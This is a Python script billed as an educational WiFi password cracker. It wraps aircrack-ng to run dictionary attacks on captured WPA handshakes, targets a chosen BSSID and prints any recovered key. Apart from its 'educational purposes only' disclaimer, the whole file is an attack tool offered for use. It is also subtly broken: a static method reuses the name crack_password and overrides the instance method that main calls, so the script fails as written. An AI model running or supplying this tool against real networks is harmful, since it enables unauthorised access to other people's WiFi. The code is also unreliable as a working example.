"""
WiFi Password Cracker
======================
Educational tool for cracking WPA passwords using dictionary attacks.
Uses captured handshakes and wordlists to attempt password recovery.

WARNING: This tool is for EDUCATIONAL PURPOSES ONLY.
Using it on networks you don't own may be illegal.

Requires: aircrack-ng, captured handshake file, wordlist
"""

import subprocess
import os
import sys
import time
from typing import Dict, Optional
from datetime import datetime


class WiFiPasswordCracker:
    """Crack WiFi passwords using dictionary attacks."""

    def __init__(self, handshake_file: str, wordlist_file: str, target_bssid: Optional[str] = None):
        """
        Initialize password cracker.

        Args:
            handshake_file: Path to captured handshake file (.cap)
            wordlist_file: Path to wordlist file
            target_bssid: Specific BSSID to target (optional)
        """
        self.handshake_file = handshake_file
        self.wordlist_file = wordlist_file
        self.target_bssid = target_bssid.upper() if target_bssid else None

        # Validate files exist
        if not os.path.exists(handshake_file):
            raise FileNotFoundError(f"Handshake file not found: {handshake_file}")
        if not os.path.exists(wordlist_file):
            raise FileNotFoundError(f"Wordlist file not found: {wordlist_file}")

    def check_dependencies(self) -> bool:
        """Check if aircrack-ng is installed."""
        try:
            result = subprocess.run(['aircrack-ng', '--help'],
                                  capture_output=True, text=True, timeout=10)
            return result.returncode == 0
        except (subprocess.CalledProcessError, FileNotFoundError, subprocess.TimeoutExpired):
            return False

    def analyze_handshake(self) -> Dict:
        """Analyze the handshake file to check for valid handshakes."""
        try:
            cmd = ['aircrack-ng', self.handshake_file]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)

            # Parse output to check for handshakes
            lines = result.stdout.split('\n')
            handshakes_found = False
            networks = []

            for line in lines:
                if 'WPA' in line and ('handshake' in line.lower() or 'WPA handshake' in line):
                    handshakes_found = True
                if line.strip().startswith('1)') or line.strip().startswith('2)'):
                    # Extract network info
                    parts = line.split()
                    if len(parts) >= 4:
                        bssid = parts[1] if len(parts) > 1 else 'Unknown'
                        essid = ' '.join(parts[3:]) if len(parts) > 3 else 'Unknown'
                        networks.append({'bssid': bssid, 'essid': essid})

            return {
                'handshakes_found': handshakes_found,
                'networks': networks,
                'file_valid': True
            }

        except subprocess.TimeoutExpired:
            return {'file_valid': False, 'error': 'Analysis timeout'}
        except Exception as e:
            return {'file_valid': False, 'error': str(e)}

    def crack_password(self) -> Dict:
        """
        Attempt to crack the password using dictionary attack.

        Returns:
            dict: Cracking results
        """
        if not self.check_dependencies():
            return {
                'success': False,
                'error': 'aircrack-ng not found. Install with: apt install aircrack-ng'
            }

        # Analyze handshake first
        analysis = self.analyze_handshake()
        if not analysis.get('file_valid', False):
            return {
                'success': False,
                'error': f'Invalid handshake file: {analysis.get("error", "Unknown error")}'
            }

        if not analysis.get('handshakes_found', False):
            return {
                'success': False,
                'error': 'No WPA handshakes found in capture file'
            }

        try:
            print(f"[*] Starting dictionary attack...")
            print(f"    Handshake file: {self.handshake_file}")
            print(f"    Wordlist: {self.wordlist_file}")
            print(f"    Target BSSID: {self.target_bssid or 'Auto-detect'}")
            print("[!] This may take a long time depending on wordlist size\n")

            # Build aircrack-ng command
            cmd = ['aircrack-ng', '-w', self.wordlist_file, '-l', '/tmp/cracked_password.txt']

            if self.target_bssid:
                cmd.extend(['-b', self.target_bssid])

            cmd.append(self.handshake_file)

            # Run the cracking process
            start_time = time.time()
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                    text=True, bufsize=1, universal_newlines=True)

            # Monitor progress
            cracked = False
            key_found = None

            while process.poll() is None:
                if os.path.exists('/tmp/cracked_password.txt'):
                    try:
                        with open('/tmp/cracked_password.txt', 'r') as f:
                            content = f.read().strip()
                            if content:
                                key_found = content
                                cracked = True
                                process.terminate()
                                break
                    except:
                        pass

                time.sleep(1)

            # Wait for process to finish if not terminated
            if process.poll() is None:
                try:
                    process.wait(timeout=5)
                except subprocess.TimeoutExpired:
                    process.kill()

            # Clean up temp file
            try:
                os.remove('/tmp/cracked_password.txt')
            except FileNotFoundError:
                pass

            elapsed_time = time.time() - start_time

            if cracked and key_found:
                return {
                    'success': True,
                    'password_found': True,
                    'password': key_found,
                    'time_elapsed': elapsed_time,
                    'handshake_file': self.handshake_file,
                    'wordlist_file': self.wordlist_file,
                    'target_bssid': self.target_bssid
                }
            else:
                return {
                    'success': True,
                    'password_found': False,
                    'time_elapsed': elapsed_time,
                    'handshake_file': self.handshake_file,
                    'wordlist_file': self.wordlist_file,
                    'target_bssid': self.target_bssid,
                    'message': 'Password not found in wordlist'
                }

        except Exception as e:
            return {
                'success': False,
                'error': str(e),
                'handshake_file': self.handshake_file,
                'wordlist_file': self.wordlist_file
            }

    @staticmethod
    def crack_password(handshake_file: str, wordlist_file: str, target_bssid: Optional[str] = None) -> Dict:
        """
        Static method to crack WiFi password.

        Args:
            handshake_file: Path to handshake capture file
            wordlist_file: Path to wordlist file
            target_bssid: Target BSSID (optional)

        Returns:
            dict: Cracking results
        """
        try:
            cracker = WiFiPasswordCracker(handshake_file, wordlist_file, target_bssid)
            return cracker.crack_password()
        except Exception as e:
            return {
                'success': False,
                'error': str(e),
                'handshake_file': handshake_file,
                'wordlist_file': wordlist_file
            }


def main():
    """Main entry point."""
    import argparse

    parser = argparse.ArgumentParser(
        description='WiFi Password Cracker - Educational WiFi Security Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python wifi_password_cracker.py -c capture.cap -w rockyou.txt
  python wifi_password_cracker.py -c handshake.cap -w wordlist.txt -b 00:11:22:33:44:55

⚠️  WARNING ⚠️
This tool is for EDUCATIONAL PURPOSES ONLY.
Using it on networks you don't own may be illegal.
Requires aircrack-ng and valid WPA handshake capture.

To crack passwords:
1. Capture WPA handshake (use wpa_handshake_capturer.py)
2. Run this tool with handshake file and wordlist
3. Wait for cracking to complete (may take hours/days)
        """
    )

    parser.add_argument('-c', '--capture', required=True,
                       help='Handshake capture file (.cap)')
    parser.add_argument('-w', '--wordlist', required=True,
                       help='Wordlist file')
    parser.add_argument('-b', '--bssid', default=None,
                       help='Target BSSID (optional)')

    args = parser.parse_args()

    # Create and run cracker
    cracker = WiFiPasswordCracker(args.capture, args.wordlist, args.bssid)
    result = cracker.crack_password()

    if result['success']:
        if result.get('password_found', False):
            print(f"[+] PASSWORD FOUND: {result['password']}")
            print(f"[+] Time elapsed: {result['time_elapsed']:.2f} seconds")
        else:
            print(f"[!] Password not found in wordlist")
            print(f"[+] Time elapsed: {result['time_elapsed']:.2f} seconds")
    else:
        print(f"[!] Error: {result['error']}")
        sys.exit(1)


if __name__ == '__main__':
    main()
